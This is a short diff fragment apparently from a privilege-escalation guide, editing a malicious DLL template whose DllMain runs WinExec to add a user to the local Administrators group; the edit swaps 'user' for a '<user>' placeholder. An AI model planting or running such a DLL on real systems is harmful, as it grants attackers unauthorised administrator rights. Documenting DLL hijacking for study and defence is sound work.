@@ -239,7 +239,7 @@ findstr dll <source code>
 #include <windows.h>
 int execCommand()
 {
- WinExec("net localgroup Administrators user /add", 1);
+ WinExec("net localgroup Administrators <user> /add", 1);
  return 0;
 }
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
